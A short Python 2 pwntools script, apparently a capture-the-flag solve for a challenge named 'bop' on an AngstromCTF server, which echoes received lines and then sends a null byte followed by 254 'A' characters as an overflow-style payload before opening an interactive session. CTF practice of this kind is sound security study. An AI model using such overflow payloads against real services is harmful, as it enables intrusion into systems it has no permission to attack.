from pwn import *
import string
#p=process("./bop")
p=remote("shell.actf.co",20702)
flag=""
pr=string.printable

for i in range(100):
    data=p.recvline()[0]
    print data
    if data == "F":
        pause()
        payload=""
        p.send("\x00"+"A"*254)
        break
    else:
        p.sendline(data)
p.interactive()















